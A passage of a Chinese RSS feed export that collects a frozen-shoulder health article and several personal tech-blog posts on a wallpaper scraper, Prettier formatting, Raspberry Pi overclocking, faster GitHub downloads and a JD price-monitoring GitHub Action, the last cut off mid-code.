user-id=\"bs2pbbtb34tcs0pncn60\" href=\"https://sspai.com/u/alliswell\">@大头Evin</a> 提供，首位猜中片名的读者，可获得彩蛋提供名额 1 次（彩蛋内容包括但不限于「猜电影」「你喜欢的经典影视作品/影人/台词」「电影冷知识」）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/16/f879a0b2e65f2ca530c4a8f7dc024a02.jpg\"></figure><p>🎁 本期彩蛋还有两道附加题，全部答对的朋友除了彩蛋提供名额，还可以获得少数派周边一份！本期抢答成功的「第一名」将会在这篇文章中更新，届时也请各位参与互动的朋友注意站内私信~</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68851"},{"title":"肩周炎的这些误区，你中招没？","date":"2021-09-17 07:23:08","description":"\n<p></p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-7a2dca785a89d089b78ec1abbc88140c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"900\" data-rawheight=\"383\" class=\"origin_image zh-lightbox-thumb\" width=\"900\" data-original=\"https://pic1.zhimg.com/v2-7a2dca785a89d089b78ec1abbc88140c_r.jpg\"></figure><p>生活中，我们经常会因长时间伏案工作，而感到肩膀酸痛。很多人说，感到肩膀痛就是肩周炎的前兆，要赶紧去看医生，以免对肩部产生更大的伤害。真的是这样吗？日常生活中我们该怎样预防肩周炎？</p>\n<p><b>什么是肩周炎？</b></p>\n<p>肩周炎的全称是肩关节周围滑囊炎，又俗称凝肩、五十肩，发病年龄大多在五十岁左右。</p>\n<p>肩周炎发病的主要症状是：肩关节僵硬不灵活，局部疼痛，并有明显的压痛点，尤其是在夜间疼痛加剧。在医生检查肩关节时，会发出“咯吱咯吱”的响声，中医称为“金鸡蛙鸣”，这是该病的一大特点。</p>\n<p>肩周炎一般多发生于一侧，个别患者痛得夜间不能入眠。严重时连日常生活中的端碗吃饭、穿衣伸袖、大小便时解系腰带以及洗脸梳头都感到困难。</p>\n<p><b>肩膀疼痛就是肩周炎吗？</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-1666f8fe3edf2661d86b262dcfa563ff_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"503\" data-rawheight=\"250\" class=\"origin_image zh-lightbox-thumb\" width=\"503\" data-original=\"https://pic4.zhimg.com/v2-1666f8fe3edf2661d86b262dcfa563ff_r.jpg\"></figure><p>肩膀疼痛大致可以分为以下几种：</p>\n<p><b>1. 肩关节不稳引起的疼痛。</b>比如有些人本身肩关节松弛或者有过肩关节外伤、肩关节脱位等疾病史，疼痛以外还会感觉到肩关节比较松，甚至在做某些动作时有要脱位的恐惧感。</p>\n<p><b>2. 肩关节发生粘连引起的疼痛。</b>这种疼痛往往早期比较严重，逐渐会出现肩关节活动幅度变小，乃至肩关节僵硬等症状。</p>\n<p><b>3. 肩关节疼痛伴有无力。</b>这种疼痛表现为肩关节的活动幅度基本正常，但是在特定的肩关节活动范围有疼痛和无力，这种情况往往出现于肩袖损伤。</p>\n<p><b>判断自己是否患有“肩周炎”，首先需要判断肩膀的疼痛到底属于上述的哪种情况。</b>例如，肩关节不稳的患者去做投篮动作可能会感觉肩膀疼痛，甚至感觉整个肩膀要掉下来。出现这种情况，应该就是属于肩关节不稳。如果肩膀活动度还好，但是做某个特定的动作的时候总觉得有点力不从心，或者听到弹响，有摩擦的感觉，应该是发生了肩袖损伤。尽管这些疼痛不属于“肩周炎”，但也应该去医院诊治。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-a32de884207750465a15c3ee27a5f766_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"331\" class=\"origin_image zh-lightbox-thumb\" width=\"600\" data-original=\"https://pic3.zhimg.com/v2-a32de884207750465a15c3ee27a5f766_r.jpg\"></figure><p>传统意义上的“肩周炎”是一大类肩关节疾病的总称，随着以磁共振为代表的影像学检查技术的发展，现代多将“肩周炎”限定到没有明显诱因的肩关节疼痛并伴随肩关节僵硬的情况。如果自己做做肩颈部的放松，或者休息一段时间有所改善，可以先不用去医院。但如果做一些很小的动作就会感觉到疼痛或者出现肩部无力、弹响的时候，就需要去看医生了。</p>\n<p><b>哪些行为容易引发肩周炎？</b></p>\n<p><b>首先，是长时间不正确的姿态。</b>例如老师要经常写板书、球类爱好者经常挥拍，他们的手经常要保持在一个比肩部高的一个状态，这种情况下，肩膀部位的碰撞和摩擦比较厉害，超过了一定的限度，就容易诱发一些损伤和炎症反应。有炎症反应之后，如果没有及时得到处理，进而会形成粘连，容易导致肩周炎。</p>\n<figure data-size=\"small\"><img src=\"https://pic3.zhimg.com/v2-452dc393708b4db5343393aef4562492_b.gif\" data-caption=\"\" data-size=\"small\" data-rawwidth=\"600\" data-rawheight=\"584\" data-thumbnail=\"https://pic3.zhimg.com/v2-452dc393708b4db5343393aef4562492_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"600\" data-original=\"https://pic3.zhimg.com/v2-452dc393708b4db5343393aef4562492_r.jpg\"></figure><p><b>另外，身体的自我修复能力降低。到四五十岁以后，身体的修复能力会明显降低，肌肉肌腱变得更加脆弱。肩关节磨损无法得到及时修复，更容易发生肩周炎</b>，这也是“五十肩”多发的原因。</p>\n<p><b>肩周炎治疗有哪些常见误区？</b></p>\n<p><b>误区一：没有影响日常生活，就不需要特别治疗。</b>肩周炎在给患者带来疼痛时，是身体发出的信号，提示肩关节已经存在问题，此时需要及时治疗，不管是否会影响生活。</p>\n<p><b>误区二：自己使用止痛药物。</b>肩周炎发作时，自己使用止痛药物得到明显效果，就认为不需要多加注意，却不知使用止痛药反而会掩盖病情，也会让疾病被拖延而让损伤加重。</p>\n<p><b>误区三：加强锻炼就能缓解。</b>有人认为肩周炎需要锻炼，确实锻炼能让肌肉以及关节得到调节，可以用爬墙手法、松懈等方式缓解。但要注意需在专业医生指导下进行锻炼，如果采取不当的方式反而会适得其反，如肩袖断裂的患者，如果进行爬墙反而会加重病情。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-821a1ed5b22ca1c7f1feb9b298cf72a0_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1076\" data-rawheight=\"595\" class=\"origin_image zh-lightbox-thumb\" width=\"1076\" data-original=\"https://pic1.zhimg.com/v2-821a1ed5b22ca1c7f1feb9b298cf72a0_r.jpg\"></figure><p><b>误区四：肩周炎不需要手术治疗。</b>一般需不需要手术治疗，要根据病情所决定，如果肩袖损伤就需要通过手术缝合才能让伤口愈合，避免疾病加重。</p>\n<p><b>误区五：疾病好转可以停止治疗。</b>很多人在治疗疾病期间，症状有所缓解或者不会疼痛就马上停止治疗，却不知肩周炎发作治疗时间比较长，在疾病有所好转不能马上停止治疗，需要根据疗程治疗才能降低复发，如果随意停止药物，疾病在没有完全得到控制的情况下易反复，而且更严重。</p>\n<p><b>生活中如何预防肩周炎？</b></p>\n<p><b>首先，要避免做容易损伤肩关节的动作。</b>肩关节是人体最灵活的大关节，稳定性比较差，更容易受到损伤。比如，有些人喜欢去打乒乓球或者羽毛球，挥拍动作不正确时会过度使用上肢的力量，此时肩关节的活动是过度的，应当避免这种非生理性的过度活动。</p>\n<p><b>其次，要避免长时间保持疲劳的姿态。</b>比如，白领人群长时间工作，导致颈肩部肌肉力量平衡发生改变，肩膀更加容易出现问题。</p>\n<p><b>另外，需要注意肩膀保暖。</b>肩膀部位容易受凉，不注意保暖会导致肩部血供不足，组织修复能力降低，促进肩周炎发作。</p>\n<figure data-size=\"small\"><img src=\"https://pic3.zhimg.com/v2-80726543c331561de30616e542d91b46_b.gif\" data-caption=\"\" data-size=\"small\" data-rawwidth=\"640\" data-rawheight=\"640\" data-thumbnail=\"https://pic3.zhimg.com/v2-80726543c331561de30616e542d91b46_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"640\" data-original=\"https://pic3.zhimg.com/v2-80726543c331561de30616e542d91b46_r.jpg\"></figure><p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/huo-jian-jun-te-se-yi-xue-zhong-xin?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">火箭军特色医学中心</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/409699793?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) 